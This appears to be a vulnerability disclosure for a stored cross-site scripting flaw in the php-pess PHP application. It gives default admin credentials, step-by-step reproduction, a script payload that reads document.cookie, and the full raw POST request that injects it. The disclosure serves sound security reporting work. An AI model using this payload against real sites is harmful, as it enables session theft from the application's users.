BUG_Author: Jean_Astruc

Vulnerability url: /php-pess/classes/Master.php?f=save_position

POST form-data parameter name exists stored cross-site scripting

### Steps to reproduce

1.Go to the admin Login

http://localhost/php-pess/admin/login.php

System Admin Access information:

Username: admin Password: admin123

2.Click on Position List and Click on + Create News

3.Put Payload into the 'Name' parameter.

Payload:<script>alert(document.cookie)</script>

![image](https://github.com/Jean-Astruc/bug_report/blob/main/xss1.png)

4.Click on Save

Transmission packet

```
POST /php-pess/classes/Master.php?f=save_position HTTP/1.1
Host: localhost
Content-Length: 357
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIM8xZ7Pkq5Ku8pbA
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/php-pess/admin/?page=positions
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=40s5h8f7t1k0c7i6bqttocu5pk
Connection: close

------WebKitFormBoundaryIM8xZ7Pkq5Ku8pbA
Content-Disposition: form-data; name="id"


------WebKitFormBoundaryIM8xZ7Pkq5Ku8pbA
Content-Disposition: form-data; name="name"

<script>alert(document.cookie)</script>
------WebKitFormBoundaryIM8xZ7Pkq5Ku8pbA
Content-Disposition: form-data; name="status"

1
------WebKitFormBoundaryIM8xZ7Pkq5Ku8pbA--
```

5.Payload will trigger when a user visits on http://localhost/php-pess/admin/?page=positions

![image](https://github.com/Jean-Astruc/bug_report/blob/main/xss2.png)
